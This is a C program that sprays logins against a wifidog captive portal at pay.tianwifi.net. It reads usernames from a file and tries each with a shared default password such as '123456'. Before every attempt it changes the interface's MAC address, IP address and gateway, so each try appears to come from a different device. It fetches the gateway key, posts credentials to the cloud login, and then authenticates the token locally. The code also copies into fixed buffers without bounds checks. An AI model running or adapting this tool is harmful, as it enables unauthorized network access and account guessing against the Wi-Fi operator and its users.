#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/sockios.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if_arp.h>
#include <errno.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <netdb.h>
#include <ctype.h>
#include <net/route.h>
#include <fcntl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <sys/types.h>
#include <netinet/if_ether.h>
#include"http.h"
#include"link.h"
#include"cJSON.h"

#define ARPHRD_ETHER  1 
#define SIZE  2048

static const unsigned char map[256] = {  
255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 253, 255,  
255, 253, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
255, 255, 255, 255, 255, 255, 255, 255, 253, 255, 255, 255,  
255, 255, 255, 255, 255, 255, 255,  62, 255, 255, 255,  63,  
 52,  53,  54,  55,  56,  57,  58,  59,  60,  61, 255, 255,  
255, 254, 255, 255, 255,   0,   1,   2,   3,   4,   5,   6,  
  7,   8,   9,  10,  11,  12,  13,  14,  15,  16,  17,  18,  
 19,  20,  21,  22,  23,  24,  25, 255, 255, 255, 255, 255,  
255,  26,  27,  28,  29,  30,  31,  32,  33,  34,  35,  36,  
 37,  38,  39,  40,  41,  42,  43,  44,  45,  46,  47,  48,  
 49,  50,  51, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
255, 255, 255, 255 };  

int base64_decode(const unsigned char *in, unsigned char *out)  
{  
    unsigned long t, x, y, z;  
    unsigned char c;  
    int g = 3;  
  
    for (x = y = z = t = 0; in[x]!=0;) {  
        c = map[in[x++]];  
        if (c == 255) return -1;  
        if (c == 253) continue;  
        if (c == 254) { c = 0; g--; }  
        t = (t<<6)|c;  
        if (++y == 4) {  
            out[z++] = (unsigned char)((t>>16)&255);  
            if (g > 1) out[z++] = (unsigned char)((t>>8)&255);  
            if (g > 2) out[z++] = (unsigned char)(t&255);  
            y = t = 0;  
        }  
    }  
    return z;  
}  

int login(char *username, char * password)
{
	//通过访问10.10.10.10获取用户信息
	char http_r[2048] = "";
 	char *get_user_url = "http://10.10.10.10";	
	char *userinfo = http_get(get_user_url);
	strcpy(http_r, userinfo);
	char key[1024] = "";
	char out[1024] = "";
	sscanf(http_r, "%*[^?]?key=%[^\n]", key);
	base64_decode(key, out);
	
	//云端登录
	//gw_address=10.10.10.10&gw_port=80&gw_id=1f0770fd4acb3ece&ip=172.16.0.201&mac=00:0c:29:39:08:11&uid=216&magic=434&rid=0&_t=1484722226
	char login_url[1024] = ""; 
	char login_user[1024] = "";
	sprintf(login_user,"username=%s&password=%s",username, password);
	sprintf(login_url, "http://pay.tianwifi.net/wifidog/login?%s", out);
	char * token = http_post(login_url, login_user);
	strcpy(http_r, token);

	//获取token值
	char json_text[1024] = "";
	sscanf(http_r, "%*[^{]%[^\n]",json_text); 
	//"token":"ebbcea43f42c646feecdcc2fd9793895"
	printf("<auth result>:%s\n", json_text);
	
	char *auth_ok = strstr(json_text, "\"r\":1");
	if (auth_ok == NULL){
		printf("username auth fail to skip \n");
		return -1;
	}
	cJSON * root = cJSON_Parse(json_text);
	cJSON* tmp1=cJSON_GetObjectItem(root,"d");  	
	cJSON* tmp2=cJSON_GetObjectItem(tmp1,"token");  	
	if( tmp2 != NULL){
		if (tmp2->valuestring != NULL)
			printf("<token>: %s\n", tmp2->valuestring);
	}

	//token 认证
	char url_auth[1024] = ""; 
	sprintf(url_auth, "http://10.10.10.10/wifidog/auth?%s&token=%s&username=%s",out,tmp2->valuestring, username);
	//printf("url=%s\n",url_auth);
	char *protal = http_get(url_auth);
	strcpy(http_r, protal);	
	printf("protal:%s\n",http_r);
	
	//释放资源
	cJSON_Delete(root); 
 
}

char *read_line(FILE *fp, char *username)
{
	char line[2048] = "";
	char *stop = fgets(line, SIZE, fp);
	sscanf(line,"%[^,]", username);
	return stop;
}

FILE * open_file(char *path)
{
	FILE *fp = fopen(path, "r");
	return fp;
}

/************************************************************* 
* 函数功能： 手动设置IP地址 
* 参数类型： 要设置的IP地址 
* 返回类型： 成功返回0，失败返回-1 
**************************************************************/  
int set_hand_ip(char *ether, const char *ipaddr, int what_addr)  
{  
    int sock_set_ip;       
    struct sockaddr_in sin_set_ip;       
    struct ifreq ifr_set_ip;       
  
    memset(&ifr_set_ip, 0, sizeof(ifr_set_ip));       
    if( ipaddr == NULL )       
    {  
        return -1;       
    }  
     
    sock_set_ip = socket( AF_INET, SOCK_STREAM, 0 );  
    //printf("sock_set_ip=====%d\n",sock_set_ip);  
    if(sock_set_ip<0)    
    {       
        perror("socket create failse...SetLocalIp!");       
        return -1;       
    }       
  
    memset( &sin_set_ip, 0, sizeof(sin_set_ip));       
    strncpy(ifr_set_ip.ifr_name, ether, sizeof(ifr_set_ip.ifr_name)-1);          
  
    sin_set_ip.sin_family = AF_INET;       
    sin_set_ip.sin_addr.s_addr = inet_addr(ipaddr);       
    memcpy( &ifr_set_ip.ifr_addr, &sin_set_ip, sizeof(sin_set_ip));       
    printf("ipaddr===%s\n",ipaddr);  
    if( ioctl( sock_set_ip, what_addr, &ifr_set_ip) < 0 )       
    {       
        perror( "Not setup interface");       
        return -1;       
    }       
  
    //设置激活标志        
    ifr_set_ip.ifr_flags |= IFF_UP |IFF_RUNNING;        
  
    //get the status of the device        
    if( ioctl( sock_set_ip, SIOCSIFFLAGS, &ifr_set_ip ) < 0 )       
    {       
         perror("SIOCSIFFLAGS");       
         return -1;       
    }       
      
    close( sock_set_ip );       
    return 0;  
} 

int macAddrSet(char * ether, char* mac)  
{  
    struct ifreq temp;  
    struct sockaddr* addr;  
  
    int fd = 0;  
    int ret = -1;  
      
    if((0 != getuid()) && (0 != geteuid()))  
        return -1;  
    if((fd = socket(AF_INET, SOCK_DGRAM, 0)) < 0)  
    {  
        return -1;  
    }  
  
    strcpy(temp.ifr_name, ether);  
    addr = (struct sockaddr*)&temp.ifr_hwaddr;  
      
    addr->sa_family = ARPHRD_ETHER;  
    memcpy(addr->sa_data, (char *)mac, 6);  
      
    ret = ioctl(fd, SIOCSIFHWADDR, &temp);  
	perror("ioctl-mac");
    close(fd);  
    return ret;  
}

int set_gateway(unsigned char ip[16])
{
    int sockFd;
    struct sockaddr_in sockaddr;
    struct rtentry rt;

    sockFd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockFd < 0)
    {
        perror("Socket create error.\n");
        return -1;
    }

    memset(&rt, 0, sizeof(struct rtentry));
    memset(&sockaddr, 0, sizeof(struct sockaddr_in));
    sockaddr.sin_family = AF_INET;
    sockaddr.sin_port = 0;
    if(inet_aton(ip, &sockaddr.sin_addr)<0)
    {
        perror("inet_aton error\n" );
        close(sockFd);
        return -1;
    }

    memcpy(&rt.rt_gateway, &sockaddr, sizeof(struct sockaddr_in));
    ((struct sockaddr_in *)&rt.rt_dst)->sin_family=AF_INET;
    ((struct sockaddr_in *)&rt.rt_genmask)->sin_family=AF_INET;
    rt.rt_flags = RTF_GATEWAY;
    if (ioctl(sockFd, SIOCADDRT, &rt)<0)
    {
        perror("ioctl(SIOCADDRT) error in set_default_route\n");
        close(sockFd);
        return -1;
    }
	close(sockFd);
    return 0;
}


int update_ip_and_eth(char *ether, char * ip, char * mask, char *gw, char * mac)
{
	int mac_ok = macAddrSet(ether, mac);
	int ip_ok = set_hand_ip(ether, ip, SIOCSIFADDR);
	if (ip_ok == 0){
		printf("set ip is ok\n");
	}
	int mask_ok = set_hand_ip(ether, mask, SIOCSIFNETMASK);
	if (mask_ok == 0){
		printf("set mask is ok\n");
	}
	int gw_ok = set_gateway(gw);
	if (gw_ok == 0){
		printf("set gw is ok\n");
	}

}


Config *reslove_configure(unsigned char *line, Config *head)
{
	Config node;
	bzero(&node, sizeof(node));

	sscanf(line, "%[^:]:%[^\n]", node.feild, node.value);
	if (node.feild != NULL && node.feild != NULL){
		head = insert_node(head, node);
		//printf("<node>:%s %s\n", node.feild, node.value);
		return head;
	}
	
	return NULL;
}

Config *load_configure(unsigned char *configure_file, Config *head)
{
     FILE * filep = open_file(configure_file);
	 unsigned char *stop = NULL;
	 unsigned char line[1024] = "";
	 int i = 0;
	 do{
		 stop = fgets(line, SIZE, filep);
		 if (stop != NULL){
			 head = reslove_configure(line, head);
		 }
	 }while(stop != NULL);
	 return head;
}

int load_config_cache(Config *head, unsigned char *start_ip, unsigned char *mask, unsigned char *gw, char *user_path, unsigned char *ether, unsigned char *password)
{
	struct ifreq temp;  
    struct sockaddr* addr;  

	Config *tmp = head;
	while(tmp != NULL){
		unsigned char *feild = tmp->feild;
		if(strcmp(feild, "start_ip") == 0){
			unsigned int ip_int = 0;
			inet_pton(AF_INET, tmp->value, &ip_int);
			memcpy(start_ip, (unsigned char *)&ip_int, 4);
		}else if(strcmp(feild, "gw") == 0){
			strcpy(gw, tmp->value);
		}else if(strcmp(feild, "mask") == 0){
			strcpy(mask, tmp->value);
		}else if(strcmp(feild, "user_file") == 0){
			strcpy(user_path, tmp->value);
		}else if(strcmp(feild, "ether") == 0){
			strcpy(ether, tmp->value);
		}else if(strcmp(feild, "default_password") == 0){
			strcpy(password, tmp->value);
		}
		tmp = tmp->next;
	}
}

int main(int agrc, char *agrv[])
{
	if(agrc < 2){
		printf("sorry you have not input config file\n");
		return -1;
	}
/*
	printf("login begin\n");
	unsigned char *ether = agrv[1]; 
	unsigned char *user_path = agrv[2];
	unsigned char *defualt_password = agrv[3];
	if (agrv[3] == NULL) {
		defualt_password = "123456";
	}
*/
	unsigned char mac[6] = {2,12,41,28,178,50};
	unsigned char ip[4] = {172,16,0,12};
	unsigned char mask[32] = "255.255.0.0";
	unsigned char gw[32] = "172.16.0.1";
	unsigned char user_path[32] = "";
	unsigned char ether[32] = "";
	unsigned char default_password[32] = "123456";
	//TODO load config from file 
	Config *head = NULL;
	head = load_configure(agrv[1], head);
	if (head == NULL){
		return -1;
	}
	//print_link(head);
	load_config_cache(head, ip, mask, gw, user_path, ether, default_password);

	FILE *fp = open_file(user_path);
	unsigned char username[128] = "";
	unsigned char ip_str[16] = "";
	unsigned char *stop = NULL;

	printf("<user_path>: %s\n", user_path);
	sprintf(ip_str, "%d.%d.%d.%d",ip[0],ip[1],ip[2],ip[3]);
	printf("<ip_str>: %s\n", ip_str);
	printf("<mask>: %s\n", mask);
	printf("<gw>: %s\n", gw);
	printf("<ether>: %s\n", ether);
	printf("<default_password>: %s\n", default_password);

	//释放链表资源 TODO

	do{
		stop = read_line(fp, username);
		if (stop != NULL){
			printf("<username>:%s\n", username);
			sprintf(ip_str, "%d.%d.%d.%d",ip[0],ip[1],ip[2],ip[3]);
			printf("<ip_str>: %s\n", ip_str);
			update_ip_and_eth(ether, ip_str, mask, gw, mac);
			usleep(200);
			login(username, default_password);
		}
		
		ip[3]++;
		if (ip[3] >= 253){
			ip[2]++; 
			ip[3] = 12;
		}

		mac[5]++;
		if (mac[5] >= 253){
			mac[4]++; 
			mac[5] = 50;
		}
	}while(stop != NULL);

	return 0;
}
